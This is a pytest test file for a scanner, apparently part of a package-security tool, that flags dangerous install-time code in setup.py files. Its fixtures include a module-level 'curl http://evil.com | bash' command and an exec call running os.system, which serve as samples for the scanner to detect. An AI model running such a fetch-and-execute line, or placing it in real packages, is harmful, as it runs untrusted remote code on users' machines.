"""Tests for the setup_hooks scanner."""

from __future__ import annotations

from pathlib import Path

from sentro.models import PackageFiles, Severity
from sentro.scanners.setup_hooks import SetupHooksScanner

scanner = SetupHooksScanner()


def _make_pkg(tmp_path: Path, setup_content: str) -> PackageFiles:
    sp = tmp_path / "setup.py"
    sp.write_text(setup_content)
    return PackageFiles(
        name="pkg", version="0.1.0",
        source_dir=tmp_path, python_files=[],
        setup_py=sp,
    )


def test_no_setup_py_no_findings(tmp_path):
    pkg = PackageFiles(name="pkg", version="0.1.0", source_dir=tmp_path, python_files=[])
    assert scanner.scan(pkg) == []


def test_clean_setup_no_findings(tmp_path):
    pkg = _make_pkg(tmp_path, "from setuptools import setup\nsetup(name='pkg', version='0.1.0')\n")
    assert scanner.scan(pkg) == []


def test_module_level_os_system_danger(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        "import os\nos.system('curl http://evil.com | bash')\nfrom setuptools import setup\nsetup()\n",
    )
    findings = scanner.scan(pkg)
    assert any(f.severity == Severity.DANGER for f in findings)


def test_os_system_inside_function_not_module_level(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        "import os\ndef custom_build():\n    os.system('make')\nfrom setuptools import setup\nsetup()\n",
    )
    findings = scanner.scan(pkg)
    # Inside a function, not module-level — should not be DANGER from setup_hooks
    assert not any(f.severity == Severity.DANGER for f in findings)


def test_cmdclass_override_warning(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        "from setuptools import setup\nfrom setuptools.command.install import install\n"
        "class MyInstall(install):\n    pass\n"
        "setup(name='pkg', cmdclass={'install': MyInstall})\n",
    )
    findings = scanner.scan(pkg)
    assert any("cmdclass" in f.title.lower() for f in findings)


def test_dynamic_install_requires_warning(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        "import subprocess\n"
        "deps = subprocess.check_output(['cat', 'requirements.txt']).decode().split()\n"
        "from setuptools import setup\nsetup(name='pkg', install_requires=deps)\n",
    )
    findings = scanner.scan(pkg)
    assert any("install_requires" in f.title.lower() for f in findings)


def test_exec_at_top_level_danger(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        "exec('import os; os.system(\"id\")')\n"
        "from setuptools import setup\nsetup()\n",
    )
    findings = scanner.scan(pkg)
    assert any(f.severity == Severity.DANGER for f in findings)
